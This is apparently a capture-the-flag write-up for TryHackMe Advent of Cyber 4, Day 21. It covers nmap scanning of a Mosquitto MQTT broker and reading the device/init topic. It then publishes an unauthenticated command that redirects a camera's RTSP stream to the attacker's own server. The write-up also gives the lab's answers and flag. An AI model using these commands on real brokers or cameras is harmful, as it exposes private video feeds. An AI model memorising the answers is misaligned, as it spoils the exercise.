# Advent of Cyber 4 - Day 21

Link: [Advent Of Cyber 4 on TryHackMe](https://tryhackme.com/room/adventofcyber4)

### Question 1

> What port is Mosquitto running on?

We run `nmap -p- $IP`

![](https://github.com/AtomicMaya/knowledge-base/blob/main/writeup_resources/aoc4/day21/1.png?raw=true)

Answer: `1883`

### Question 2

> Is the device/init topic enumerated by Nmap during a script scan of all ports? (y/n)

We run `nmap -sC -sV -p1883 $IP`

![](https://github.com/AtomicMaya/knowledge-base/blob/main/writeup_resources/aoc4/day21/2.png?raw=true)

Answer: `y`

### Question 3

> What Mosquitto version is the device using?


We look at the previous answer.

![](https://github.com/AtomicMaya/knowledge-base/blob/main/writeup_resources/aoc4/day21/3.png?raw=true)

Answer: `1.6.9`

### Question 4

> What flag is obtained from viewing the RTSP stream?

(You may need to install the `mosquitto_clients` package.)

We run `mosquitto_sub -h $IP -t device/init` and get the ID: `QMMCDV5JDFQ31SCVV9IU`

![](https://github.com/AtomicMaya/knowledge-base/blob/main/writeup_resources/aoc4/day21/4.1.png?raw=true)

We then setup our Docker container: `docker run --rm -it --network=host aler9/rtsp-simple-server`

Then we push the command: `mosquitto_pub -h $IP -t device/QMMCDV5JDFQ31SCVV9IU/cmd -m "{CMD:10,URL:RTSP://$MY_IP:8554/camera}" -d`

Then we open VLC: `vlc rtsp://127.0.0.1:8554/camera`: 

![](https://github.com/AtomicMaya/knowledge-base/blob/main/writeup_resources/aoc4/day21/4.2.png?raw=true)

Answer: `THM{UR_CAMERA_IS_MINE}`